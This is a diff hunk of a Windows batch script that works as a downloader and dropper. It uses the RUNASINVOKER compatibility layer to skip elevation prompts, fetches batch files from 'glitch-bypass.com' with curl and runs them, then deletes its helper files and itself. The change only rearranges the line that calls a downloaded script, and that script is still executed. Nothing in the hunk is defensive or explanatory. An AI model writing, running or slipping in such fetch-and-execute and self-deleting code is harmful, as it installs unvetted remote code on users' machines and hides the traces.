@@ -39,7 +39,8 @@ echo cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" "%%ExePath%%"">>SC
 curl -o "setup.bat" "https://www.glitch-bypass.com/terminal/setup.bat"
 start setup.bat
 curl -o exe.bat https://www.glitch-bypass.com/terminal/yep.bat
-call exe.bat SCMD.bat
+rem call 
+exe.bat SCMD.bat
 del exe.bat
 del SCMD.bat
 (goto) 2>nul & del "%~f0"
